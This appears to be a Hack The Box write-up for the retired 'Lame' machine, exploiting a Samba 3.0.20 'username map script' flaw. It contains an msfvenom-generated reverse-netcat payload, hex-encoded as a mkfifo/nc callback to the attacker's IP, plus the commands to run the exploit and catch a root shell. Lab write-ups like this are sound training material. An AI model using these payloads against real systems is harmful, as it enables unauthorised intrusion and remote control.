---
layout: post
title: Hack the Box - Lame
date: 2020-03-16 22:11:22 +0100
description: Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.
img: lame.png
fig-caption: Lame
categories: HackTheBox
tags: [Easy, Linux, Retired, CVE]
---
## Overview
Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.
## Enumeration
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/legacy]
└─$ sudo nmap -p- -T4  10.129.113.79  
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 15:29 GMT
Nmap scan report for 10.129.113.79
Host is up (0.017s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd
```
After running initial port enumeration the ports that seem most of interest are 139,445 and possibly 3632. However after service version enumeration and a google we find there is common samba vulnerability for this version called "username map script" exploit.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/legacy]
└─$ sudo nmap -p139,445 -A  10.129.113.79
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 15:42 GMT
Nmap scan report for 10.129.113.79
Host is up (0.018s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```
## Foothold
As we used metaploit for the previous box I was keen to not use it for this box although there is module that can be utilised. While googling during enumeration I found the following exploit: https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851 First we need to create the payload to place in this script.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/lame]
└─$ msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.14.27 LPORT=9999 -f python
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 93 bytes
Final size of python file: 471 bytes
buf =  b""
buf += b"\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x69"
buf += b"\x61\x7a\x75\x76\x3b\x20\x6e\x63\x20\x31\x30\x2e\x31"
buf += b"\x30\x2e\x31\x34\x2e\x32\x37\x20\x39\x39\x39\x39\x20"
buf += b"\x30\x3c\x2f\x74\x6d\x70\x2f\x69\x61\x7a\x75\x76\x20"
buf += b"\x7c\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f\x74"
buf += b"\x6d\x70\x2f\x69\x61\x7a\x75\x76\x20\x32\x3e\x26\x31"
buf += b"\x3b\x20\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x69\x61\x7a"
buf += b"\x75\x76"
```
In order to run it I used a docker container as we need to install dependencies for python 2.7
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/lame]
└─$ sudo docker run -v "$(pwd)":/lame -it --entrypoint /bin/bash python:2.7.18-stretch
root@2d402da68463:/# cd /lame
root@2d402da68463:/lame# pip install impacket
root@2d402da68463:/lame# pip install pysmb
root@2d402da68463:/lame# python samba-exploit.py 10.129.113.79
```
Then we can start a listener, and after executing the exploit we should receive a shell.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/lame]
└─$ nc -nlvp 9999        
listening on [any] 9999 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.113.79] 39795
which python
/usr/bin/python
python -c "import pty; pty.spawn('/bin/bash')"
root@lame:/# whoami
whoami
root
```
## Privilege Escalation
As we attained root from this exploit and have access to the root flag, there is no need for privilege escalation.